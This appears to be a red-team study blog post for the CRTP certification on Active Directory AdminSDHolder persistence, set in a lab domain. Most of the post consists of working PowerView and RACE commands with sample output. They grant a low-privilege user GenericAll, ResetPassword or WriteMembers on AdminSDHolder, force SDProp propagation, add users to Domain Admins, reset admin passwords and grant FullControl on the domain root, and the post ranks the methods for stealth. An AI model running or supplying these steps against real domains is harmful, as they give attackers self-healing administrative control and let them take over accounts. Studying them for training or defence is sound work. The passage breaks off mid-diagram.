---
title: "CRTP Deep Dive: AdminSDHolder Persistence — ACL Abuse, SDProp Propagation, Domain Root FullControl & DCSync"
date: 2026-04-10 01:00:00 +0200
categories: [Red Team, CRTP]
tags: [adminsdholder, sdprop, acl-abuse, persistence, dcsync, domain-admins, active-directory, windows, crtp]
description: "A comprehensive guide covering AdminSDHolder persistence via ACL manipulation, SDProp propagation, granular permission abuse (ResetPassword, WriteMembers), Domain Root FullControl, and DCSync — the crown jewel of AD persistence — all from the CRTP perspective."
pin: true
math: true
mermaid: true
---

## Introduction

In Active Directory, once an attacker gains Domain Admin privileges, the next objective is **persistence** — ensuring continued access even if the initial compromise vector is discovered and remediated. One of the most powerful and stealthy persistence mechanisms abuses a built-in AD protection feature: **AdminSDHolder**.

This post covers the complete AdminSDHolder persistence attack chain as taught in the **Certified Red Team Professional (CRTP)** course:

1. **Understanding AdminSDHolder & SDProp** — how the protection mechanism works and how to weaponize it
2. **Granting FullControl** — giving a low-privilege user GenericAll on all protected objects
3. **Granting Granular Permissions** — ResetPassword, WriteMembers for surgical access
4. **Verifying & Triggering Propagation** — ensuring permissions are applied
5. **Abusing the Permissions** — adding users to DA, resetting admin passwords
6. **Domain Root FullControl** — granting GenericAll on the domain root
7. **DCSync Persistence** — the crown jewel of domain persistence

> All commands in this post are **PowerShell-based** and designed for **Windows environments**, as used in CRTP labs.
{: .prompt-info }

---

## Understanding AdminSDHolder & SDProp

### What is AdminSDHolder?

**AdminSDHolder** is a special container object located under the System container in every Active Directory domain (`CN=AdminSDHolder,CN=System,DC=domain,DC=local`). Its Access Control List (ACL) serves as a **security template** that is applied to all **protected groups** and their members.

```
┌──────────────────────────────────────────────────────────────────┐
│                ADMINSDHOLDER AT A GLANCE                          │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Location  : CN=AdminSDHolder,CN=System,DC=domain,DC=local       │
│                                                                  │
│  Purpose   : Security TEMPLATE for protected groups              │
│               Its ACL is copied to ALL protected objects          │
│                                                                  │
│  Enforced  : Every 60 minutes by SDProp process                  │
│               (runs on PDC Emulator)                             │
│                                                                  │
│  Key Idea  : If you MODIFY AdminSDHolder's ACL, those           │
│               changes PROPAGATE to every protected group!        │
│                                                                  │
│  Protected Groups Include:                                       │
│  ┌─────────────────────────────────────────────────┐             │
│  │  • Domain Admins        • Enterprise Admins     │             │
│  │  • Schema Admins        • Administrators        │             │
│  │  • Backup Operators     • Server Operators      │             │
│  │  • Account Operators    • Print Operators       │             │
│  │  • Domain Controllers   • Read-only DCs         │             │
│  │  • Replicator           • krbtgt account        │             │
│  │  • Administrator (RID 500)                      │             │
│  └─────────────────────────────────────────────────┘             │
│                                                                  │
│  adminCount Attribute:                                           │
│  All members of protected groups have adminCount = 1             │
│  This attribute remains even AFTER removal from the group!       │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### How SDProp Works (Normal vs Abused)

```
┌──────────────────────────────────────────────────────────────────┐
│            SDPROP — NORMAL OPERATION                              │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Every 60 Minutes on the PDC Emulator:                           │
│                                                                  │
│  ┌─────────────────────┐                                         │
│  │  AdminSDHolder ACL  │    (template with default secure ACLs)  │
│  │  ─────────────────  │                                         │
│  │  • Domain Admins    │                                         │
│  │    → Full Control   │                                         │
│  │  • Enterprise Admins│                                         │
│  │    → Full Control   │                                         │
│  │  • SYSTEM           │                                         │
│  │    → Full Control   │                                         │
│  └──────────┬──────────┘                                         │
│             │                                                    │
│             │  SDProp runs (every 60 min)                        │
│             │  "Copy ACL to all protected objects"               │
│             │                                                    │
│       ┌─────┼─────┬─────────┬─────────┐                         │
│       ▼     ▼     ▼         ▼         ▼                         │
│  ┌────────┐┌──────┐┌───────┐┌────────┐┌──────────┐              │
│  │Domain  ││Enter-││Schema ││Admini- ││Backup    │              │
│  │Admins  ││prise ││Admins ││strators││Operators │              │
│  │        ││Admins││       ││        ││          │              │
│  └────────┘└──────┘└───────┘└────────┘└──────────┘              │
│                                                                  │
│  ★ If an admin manually changes the ACL on Domain Admins,       │
│    SDProp RESETS it back to match AdminSDHolder within 60 min!  │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────┐
│            SDPROP — WEAPONIZED (ATTACKER ABUSE)                  │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Attacker modifies AdminSDHolder ACL:                            │
│                                                                  │
│  ┌──────────────────────────┐                                    │
│  │   AdminSDHolder ACL      │                                    │
│  │   ─────────────────────  │                                    │
│  │   • Domain Admins → FC   │ (normal)                           │
│  │   • Enterprise Adm → FC  │ (normal)                           │
│  │   • SYSTEM → FC          │ (normal)                           │
│  │   ★ student1 → GenericAll│ ← ATTACKER ADDED THIS!           │
│  └──────────────┬───────────┘                                    │
│                 │                                                 │
│                 │  SDProp runs...                                 │
│                 │                                                 │
│       ┌─────────┼──────┬──────────┬──────────┐                   │
│       ▼         ▼      ▼          ▼          ▼                   │
│  ┌────────┐ ┌──────┐ ┌───────┐ ┌────────┐ ┌──────────┐          │
│  │Domain  │ │Enter-│ │Schema │ │Admini- │ │Backup    │          │
│  │Admins  │ │prise │ │Admins │ │strators│ │Operators │          │
│  │        │ │Admins│ │       │ │        │ │          │          │
│  │student1│ │stud.1│ │stud.1 │ │stud.1  │ │stud.1    │          │
│  │has FC! │ │has FC│ │has FC │ │has FC  │ │has FC    │          │
│  └────────┘ └──────┘ └───────┘ └────────┘ └──────────┘          │
│                                                                  │
│  ★ student1 now has FullControl on EVERY protected group!       │
│  ★ Even if a defender removes the ACE from Domain Admins,       │
│    SDProp puts it back within 60 minutes!                       │
│  ★ The only fix: remove the ACE from AdminSDHolder itself!      │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Why This is Devastating

```
┌──────────────────────────────────────────────────────────────────┐
│        WHY ADMINSDHOLDER PERSISTENCE IS SO POWERFUL              │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. SELF-HEALING BACKDOOR                                        │
│     If defenders remove the malicious ACE from Domain Admins,    │
│     SDProp re-applies it within 60 minutes automatically.        │
│     Defenders must find and clean the AdminSDHolder object!      │
│                                                                  │
│  2. COVERS ALL PRIVILEGED GROUPS                                 │
│     One modification = access to Domain Admins, Enterprise       │
│     Admins, Schema Admins, Backup Operators, and more.           │
│                                                                  │
│  3. DOESN'T REQUIRE GROUP MEMBERSHIP                             │
│     student1 is NOT a member of Domain Admins.                   │
│     But student1 has GenericAll ON Domain Admins.                 │
│     → Can add themselves or anyone at any time.                  │
│                                                                  │
│  4. SUBTLE AND HARD TO DETECT                                    │
│     No new group memberships to alert on.                        │
│     ACL changes on AdminSDHolder are rarely monitored.           │
│     The user looks like a regular account.                       │
│                                                                  │
│  5. SURVIVES PASSWORD RESETS                                     │
│     Changing student1's password doesn't help — the ACE          │
│     is tied to their SID, not their credentials.                 │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Granting FullControl on AdminSDHolder

### Method 1: Using PowerView

```powershell
# ============================================================
# GRANT FULLCONTROL (GenericAll) ON ADMINSDHOLDER
# Requires: Domain Admin privileges
# Tool: PowerView (PowerSploit)
# ============================================================

# Load PowerView
. .\PowerView.ps1

# Grant student1 FullControl (GenericAll) on AdminSDHolder
Add-DomainObjectAcl `
    -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' `
    -PrincipalIdentity student1 `
    -Rights All `
    -PrincipalDomain dollarcorp.moneycorp.local `
    -TargetDomain dollarcorp.moneycorp.local `
    -Verbose
```

#### Example Output

```
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
         (|(|(samAccountName=student1)(name=student1)(displayname=student1)))
VERBOSE: [Get-DomainSearcher] search base:
         LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Get-DomainObject] Extracted domain 'dollarcorp.moneycorp.local' from
         'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local'
VERBOSE: [Get-DomainSearcher] search base:
         LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
         (|(distinguishedname=CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local))
VERBOSE: [Add-DomainObjectAcl] Granting principal
         CN=student1,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
         'All' on CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal
         CN=student1,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
         rights GUID '00000000-0000-0000-0000-000000000000' on
         CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
```

> The GUID `00000000-0000-0000-0000-000000000000` represents **GenericAll** — full control over the object.
{: .prompt-info }

### Method 2: Using the RACE Toolkit (Set-DCPermissions)

```powershell
# ============================================================
# GRANT FULLCONTROL USING RACE TOOLKIT
# Alternative method — same result
# ============================================================

Set-DCPermissions `
    -Method AdminSDHolder `
    -SAMAccountName student1 `
    -Right GenericAll `
    -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' `
    -Verbose
```

#### Example Output

```
VERBOSE: Connecting to DC=dollarcorp,DC=moneycorp,DC=local...
VERBOSE: Retrieving AdminSDHolder object...
VERBOSE: Current ACL contains 8 Access Control Entries
VERBOSE: Adding GenericAll permission for student1 (SID: S-1-5-21-719815819-3726368948-3917688200-4601)
VERBOSE: Successfully modified AdminSDHolder ACL
VERBOSE: New ACL contains 9 Access Control Entries
VERBOSE: Waiting for SDProp to propagate changes (runs every ~60 minutes)...
```

### Methods Comparison

```
┌──────────────────────────────────────────────────────────────────┐
│         POWERVIEW vs RACE TOOLKIT COMPARISON                     │
├──────────────────────┬──────────────────────┬────────────────────┤
│ Feature              │ PowerView            │ RACE Toolkit       │
├──────────────────────┼──────────────────────┼────────────────────┤
│ Cmdlet               │ Add-DomainObjectAcl  │ Set-DCPermissions  │
│ Parameter for target │ -TargetIdentity      │ -DistinguishedName │
│ Parameter for user   │ -PrincipalIdentity   │ -SAMAccountName    │
│ Rights specification │ -Rights All          │ -Right GenericAll  │
│ Domain specification │ -PrincipalDomain     │ Auto-detected      │
│                      │ -TargetDomain        │                    │
│ Granular rights      │ ResetPassword,       │ GenericAll,        │
│                      │ WriteMembers, DCSync │ GenericWrite, etc. │
│ Ease of use          │ ★★★★☆              │ ★★★★★             │
│ Flexibility          │ ★★★★★              │ ★★★☆☆             │
│ CRTP Usage           │ Primary tool         │ Alternative tool   │
└──────────────────────┴──────────────────────┴────────────────────┘
```

---

## Granting Granular Permissions

Instead of granting **FullControl** (which is extremely powerful but also detectable), you can grant **specific rights** for more surgical persistence.

### The Granular Rights

```
┌──────────────────────────────────────────────────────────────────┐
│          GRANULAR PERMISSIONS YOU CAN GRANT                      │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────────┬────────────────────────────────────────┐   │
│  │ Right            │ What It Lets You Do                    │   │
│  ├──────────────────┼────────────────────────────────────────┤   │
│  │ GenericAll       │ EVERYTHING — full control over the     │   │
│  │ (-Rights All)    │ object. Can read, write, delete,       │   │
│  │                  │ change permissions, reset passwords,   │   │
│  │                  │ modify members. THE NUCLEAR OPTION.    │   │
│  │                  │                                        │   │
│  │ ResetPassword    │ Reset the password of ANY protected    │   │
│  │                  │ account (Domain Admins, etc.)          │   │
│  │                  │ WITHOUT knowing the current password.  │   │
│  │                  │ ★ Noisy — admin loses access!         │   │
│  │                  │                                        │   │
│  │ WriteMembers     │ Add/remove members from protected      │   │
│  │                  │ groups. Can add yourself or a          │   │
│  │                  │ controlled user to Domain Admins.      │   │
│  │                  │ ★ Effective but triggers alerts!       │   │
│  │                  │                                        │   │
│  │ DCSync           │ Grant replication rights on the        │   │
│  │                  │ domain root. Allows pulling all        │   │
│  │                  │ password hashes via MS-DRSR protocol.  │   │
│  │                  │ ★ Most stealthy — no group changes!   │   │
│  └──────────────────┴────────────────────────────────────────┘   │
│                                                                  │
│  STEALTH RANKING (most stealthy → least stealthy):              │
│                                                                  │
│  DCSync > GenericAll > WriteMembers > ResetPassword              │
│  (no group   (broad     (adds user    (admin locked             │
│   changes,    access,    to group —    out — will               │
│   network     hard to    EventID      notice                    │
│   only)       pinpoint)  4728/4756)   immediately!)             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 1. Granting ResetPassword Rights

This allows student1 to reset passwords for ALL accounts that inherit their ACL from AdminSDHolder — typically Domain Admins, Enterprise Admins, and other protected accounts.

```powershell
# ============================================================
# GRANT ResetPassword ON ADMINSDHOLDER
# ============================================================

Add-DomainObjectAcl `
    -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' `
    -PrincipalIdentity student1 `
    -Rights ResetPassword `
    -PrincipalDomain dollarcorp.moneycorp.local `
    -TargetDomain dollarcorp.moneycorp.local `
    -Verbose
```

#### Example Output

```
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
         (|(|(samAccountName=student1)(name=student1)(displayname=student1)))
VERBOSE: [Get-DomainSearcher] search base:
         LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal
         CN=student1,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
         'ResetPassword' on CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal
         CN=student1,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
         rights GUID '00299570-246d-11d0-a768-00aa006e0529' on
         CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
```

> The GUID `00299570-246d-11d0-a768-00aa006e0529` is the **User-Force-Change-Password** extended right.
{: .prompt-info }

### 2. Granting WriteMembers Rights

This grants the ability to modify group memberships for protected groups — meaning student1 can add anyone (including themselves) to Domain Admins.

```powershell
# ============================================================
# GRANT WriteMembers ON ADMINSDHOLDER
# ============================================================

Add-DomainObjectAcl `
    -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' `
    -PrincipalIdentity student1 `
    -Rights WriteMembers `
    -PrincipalDomain dollarcorp.moneycorp.local `
    -TargetDomain dollarcorp.moneycorp.local `
    -Verbose
```

#### Example Output

```
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
         (|(|(samAccountName=student1)(name=student1)(displayname=student1)))
VERBOSE: [Get-DomainSearcher] search base:
         LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal
         CN=student1,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
         'WriteMembers' on CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal
         CN=student1,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
         rights GUID 'bf9679c0-0de6-11d0-a285-00aa003049e2' on
         CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
```

> The GUID `bf9679c0-0de6-11d0-a285-00aa003049e2` corresponds to the **Member** attribute write permission.
{: .prompt-info }

---

## Triggering SDProp Propagation

After modifying AdminSDHolder's ACL, you must **wait for SDProp** to propagate the changes to all protected objects. By default, SDProp runs every **60 minutes** on the PDC Emulator.

```
┌──────────────────────────────────────────────────────────────────┐
│              SDPROP PROPAGATION TIMELINE                          │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  T+0 min    T+60 min    T+120 min                                │
│  │          │           │                                        │
│  ▼          ▼           ▼                                        │
│  ┌──┐       ┌──┐        ┌──┐                                     │
│  │M │       │P │        │P │                                     │
│  │O │       │R │        │R │                                     │
│  │D │       │O │        │O │                                     │
│  │I │       │P │        │P │                                     │
│  │F │       │A │        │A │                                     │
│  │Y │       │G │        │G │                                     │
│  └──┘       └──┘        └──┘                                     │
│  Attacker   SDProp runs Permissions                              │
│  modifies   → copies    re-applied                               │
│  AdminSD    ACL to all  (if defender                              │
│  Holder     protected   removed them)                            │
│             objects                                               │
│                                                                  │
│  ★ You can FORCE SDProp to run immediately:                     │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Forcing SDProp to Run Immediately

```powershell
# ============================================================
# TRIGGER SDPROP MANUALLY (requires DA on the PDC Emulator)
# ============================================================

# For Modern Systems (Server 2008 and later):
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose

# For Legacy Systems (Pre-Server 2008):
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

#### Example Output

```
VERBOSE: Connecting to PDC Emulator: dcorp-dc.dollarcorp.moneycorp.local
VERBOSE: Triggering Security Descriptor Propagator task...
VERBOSE: [====================] 100% Complete
VERBOSE: SDProp propagation completed successfully.
VERBOSE: Permissions from AdminSDHolder have been applied to all protected objects.
VERBOSE: Elapsed time: 12 seconds
```

> In CRTP labs, after running `Invoke-SDPropagator`, the changes are applied almost immediately. In production environments, you can also wait the default 60 minutes.
{: .prompt-tip }

---

## Verifying Permissions on Domain Admins

After SDProp has run, the permissions granted on AdminSDHolder should now be visible on all protected objects, including the Domain Admins group.

### Method 1: Using PowerView (as a Normal User)

```powershell
# ============================================================
# VERIFY PERMISSIONS — PowerView Method
# ============================================================

# This retrieves the ACL for the "Domain Admins" group,
# resolves GUIDs to readable names,
# converts SIDs to names,
# and filters for student1

Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {
    $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_
} | ?{$_.IdentityName -match "student1"}
```

#### Example Output

```
ObjectDN               : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectSID              : S-1-5-21-719815819-3726368948-3917688200-512
ActiveDirectoryRights  : GenericAll
BinaryLength           : 36
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 983551
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688200-4601
AceType                : AccessAllowed
AceFlags               : None
IsInherited            : False
InheritanceFlags       : None
PropagationFlags       : None
AuditFlags             : None
IdentityName           : dcorp\student1
```

> **ActiveDirectoryRights: GenericAll** confirms that student1 has full control over the Domain Admins group. This was propagated from AdminSDHolder by SDProp.
{: .prompt-info }

### Method 2: Using the ActiveDirectory Module

```powershell
# ============================================================
# VERIFY PERMISSIONS — ActiveDirectory Module Method
# ============================================================

# Query the Access property directly via the AD drive provider
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}
```

#### Example Output

```
ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : DCORP\student1
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
```

### Verification Decision Flow

```
┌──────────────────────────────────────────────────────────────────┐
│           PERMISSION VERIFICATION WORKFLOW                        │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Step 1: Did you modify AdminSDHolder?                           │
│  │                                                               │
│  ├── YES → Step 2: Has SDProp run?                               │
│  │   │                                                           │
│  │   ├── Not sure → Run: Invoke-SDPropagator                    │
│  │   │              -timeoutMinutes 1 -showProgress -Verbose     │
│  │   │                                                           │
│  │   └── YES → Step 3: Verify on a protected object              │
│  │       │                                                       │
│  │       ├── PowerView Method:                                   │
│  │       │   Get-DomainObjectAcl -Identity 'Domain Admins'       │
│  │       │     -ResolveGUIDs | ...                               │
│  │       │                                                       │
│  │       └── AD Module Method:                                   │
│  │           (Get-Acl -Path 'AD:\CN=Domain Admins,...').Access   │
│  │           | ?{$_.IdentityReference -match 'student1'}         │
│  │                                                               │
│  │   Step 4: Check the output                                    │
│  │   │                                                           │
│  │   ├── GenericAll / FullControl → Ready to exploit             │
│  │   ├── ExtendedRight (ResetPassword) → Can reset passwords    │
│  │   ├── WriteProperty (Member) → Can modify membership         │
│  │   └── No results → SDProp hasn't run yet, wait or trigger    │
│  │                                                               │
│  └── NO → Modify AdminSDHolder first (see previous section)      │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Exploiting the Permissions — The End Game

### The Complete Attack Cycle

```
┌──────────────────────────────────────────────────────────────────┐
│          THE ADMINSDHOLDER ATTACK CYCLE                           │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  PHASE 1: PERSISTENCE                                            │
│  ┌─────────────────────────────────────────────┐                 │
│  │ Modify AdminSDHolder ACL                    │                 │
│  │ → Add student1 with GenericAll/ResetPass/   │                 │
│  │   WriteMembers                              │                 │
│  └──────────────────────┬──────────────────────┘                 │
│                         │                                        │
│                         ▼                                        │
│  PHASE 2: PROPAGATION                                            │
│  ┌─────────────────────────────────────────────┐                 │
│  │ SDProp pushes permissions to ALL protected  │                 │
│  │ groups: Domain Admins, Enterprise Admins,   │                 │
│  │ Schema Admins, Backup Operators, etc.       │                 │
│  │ → Invoke-SDPropagator (or wait 60 min)      │                 │
│  └──────────────────────┬──────────────────────┘                 │
│                         │                                        │
│                         ▼                                        │
│  PHASE 3: EXPLOITATION                                           │
│  ┌─────────────────────────────────────────────┐                 │
│  │ As a low-privileged user (student1):        │                 │
│  │ → Add yourself to Domain Admins             │                 │
│  │ → OR reset a DA's password                  │                 │
│  │ → OR modify any protected group             │                 │
│  └──────────────────────┬──────────────────────┘                 │
│                         │                                        │
│                         ▼                                        │
│  PHASE 4: ELEVATION                                              │
│  ┌─────────────────────────────────────────────┐                 │
│  │ Full administrative access to the domain!   │                 │
│  │ → Can access any machine                    │                 │
│  │ → Can modify any object                     │                 │
│  │ → Can perform DCSync                        │                 │
│  │ → COMPLETE DOMAIN COMPROMISE!               │                 │
│  └─────────────────────────────────────────────┘                 │
│                                                                  │
│  ★ Even if defenders remove student1 from Domain Admins,        │
│    the AdminSDHolder ACE persists → re-add within minutes!      │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Adding a User to Domain Admins

If you granted **GenericAll** or **WriteMembers** on AdminSDHolder, you can now add any user to the Domain Admins group.

```powershell
# ============================================================
# ADD USER TO DOMAIN ADMINS — PowerView
# ============================================================

# Using PowerView (standard way)
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```

#### Example Output

```
VERBOSE: [Get-DomainGroup] Using identity filter for 'Domain Admins'
VERBOSE: [Get-DomainSearcher] search base:
         LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainGroupMember] Adding member 'testda' to group 'Domain Admins'
VERBOSE: [Add-DomainGroupMember] Successfully added 'testda' to 'Domain Admins'
```

```powershell
# ============================================================
# ADD USER TO DOMAIN ADMINS — ActiveDirectory Module
# ============================================================

# Using the native Microsoft AD module
Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```

#### Verifying the Addition

```powershell
# Verify the user was added
Get-DomainGroupMember -Identity 'Domain Admins' | Select-Object MemberName, MemberSID

# Or using the AD module
Get-ADGroupMember -Identity 'Domain Admins' | Select-Object Name, SID
```

#### Example Output

```
MemberName      MemberSID
----------      ---------
Administrator   S-1-5-21-719815819-3726368948-3917688200-500
krbtgt          S-1-5-21-719815819-3726368948-3917688200-502
svcadmin        S-1-5-21-719815819-3726368948-3917688200-1118
testda          S-1-5-21-719815819-3726368948-3917688200-4605  ← NEW!
```

### Abusing ResetPassword — Taking Over Admin Accounts

If you granted the **ResetPassword** right instead of full control, you can take over any protected account by simply changing its password — **without knowing the original password**.

```powershell
# ============================================================
# RESET PASSWORD — PowerView
# ============================================================

# Reset a target user's password using PowerView
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

#### Example Output

```
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'testda'
VERBOSE: [Set-DomainUserPassword] Password for user 'testda' successfully changed
```

```powershell
# ============================================================
# RESET PASSWORD — ActiveDirectory Module
# ============================================================

# Reset password using the native Microsoft module
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

#### Example Output

```
VERBOSE: Performing the operation "Set-ADAccountPassword" on target "CN=testda,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local".
```

### Security Implications of ResetPassword

```
┌──────────────────────────────────────────────────────────────────┐
│          RESETPASSWORD SECURITY IMPLICATIONS                     │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ BYPASSING KNOWLEDGE                                       │   │
│  │ This method does NOT require you to know the original     │   │
│  │ password of the target admin account. You simply          │   │
│  │ overwrite it with a new password of your choosing.        │   │
│  └───────────────────────────────────────────────────────────┘   │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ TARGETING PROTECTED USERS                                 │   │
│  │ Because you modified the AdminSDHolder template, this     │   │
│  │ permission propagates to ALL members of protected groups: │   │
│  │ Domain Admins, Enterprise Admins, Backup Operators, etc.  │   │
│  │ You can reset ANY of their passwords.                     │   │
│  └───────────────────────────────────────────────────────────┘   │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ ⚠ STEALTH WARNING                                        │   │
│  │ Resetting an administrator's password is NOISY and will   │   │
│  │ likely be noticed when the legitimate admin can no longer │   │
│  │ log in. However, it is an effective way to gain immediate │   │
│  │ access to a Domain Admin's identity.                      │   │
│  │                                                           │   │
│  │ Detection Events:                                         │   │
│  │ • Event ID 4724 — Password Reset Attempt                 │   │
│  │ • Event ID 4723 — Password Change Attempt                │   │
│  │ • Admin calls helpdesk: "I can't log in!"                │   │
│  └───────────────────────────────────────────────────────────┘   │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Granting FullControl at the Domain Root

Beyond AdminSDHolder, you can also grant permissions directly on the **domain root object** itself. This gives even broader access — not just to protected groups, but to the entire domain.

### Using PowerView

```powershell
# ============================================================
# GRANT FULLCONTROL ON THE DOMAIN ROOT — PowerView
# ============================================================

# Add full-control permissions for student1 to the domain root
Add-DomainObjectAcl `
    -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' `
    -PrincipalIdentity student1 `
    -Rights All `
    -PrincipalDomain dollarcorp.moneycorp.local `
    -TargetDomain dollarcorp.moneycorp.local `
    -Verbose
```

#### Example Output

```
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
         (|(|(samAccountName=student1)(name=student1)(displayname=student1)))
VERBOSE: [Get-DomainSearcher] search base:
         LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal
         CN=student1,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
         'All' on DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal
         CN=student1,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
         rights GUID '00000000-0000-0000-0000-000000000000' on
         DC=dollarcorp,DC=moneycorp,DC=local
```

### Using ActiveDirectory Module and RACE

```powershell
# ============================================================
# GRANT FULLCONTROL ON THE DOMAIN ROOT — RACE Toolkit
# ============================================================

Set-ADACL `
    -SamAccountName studentuser1 `
    -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' `
    -Right GenericAll `
    -Verbose
```

#### Example Output

```
VERBOSE: Connecting to dollarcorp.moneycorp.local...
VERBOSE: Retrieving domain root object...
VERBOSE: Adding GenericAll permission for studentuser1
VERBOSE: Successfully modified domain root ACL
```

### Impact of Domain Root FullControl

```
┌──────────────────────────────────────────────────────────────────┐
│          DOMAIN ROOT FULLCONTROL — WHAT IT ENABLES               │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  With GenericAll on DC=dollarcorp,DC=moneycorp,DC=local:         │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ 1. DCSYNC ATTACKS                                         │   │
│  │    Grant yourself "Get Replication Changes" permissions    │   │
│  │    → Dump ALL user password hashes (including krbtgt!)    │   │
│  │    → No code execution on DC required                     │   │
│  │    → Most stealthy persistence method                     │   │
│  └───────────────────────────────────────────────────────────┘   │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ 2. OBJECT MANIPULATION                                    │   │
│  │    Create, delete, or modify ANY object in the domain     │   │
│  │    that inherits permissions from the root:               │   │
│  │    • Create new user accounts                             │   │
│  │    • Modify existing group memberships                    │   │
│  │    • Change GPO links                                     │   │
│  │    • Modify trust relationships                           │   │
│  └───────────────────────────────────────────────────────────┘   │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ 3. DELEGATION ABUSE                                       │   │
│  │    Configure Kerberos delegation on any account           │   │
│  │    → Unconstrained/constrained/RBCD delegation            │   │
│  │    → Additional lateral movement paths                    │   │
│  └───────────────────────────────────────────────────────────┘   │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐   │
│  │ 4. OU/CONTAINER CONTROL                                   │   │
│  │    Full control over all Organizational Units              │   │
│  │    → Modify GPO links on any OU                           │   │
│  │    → Move objects between OUs                             │   │
│  │    → Delete protective OUs                                │   │
│  └───────────────────────────────────────────────────────────┘   │
│                                                                  │
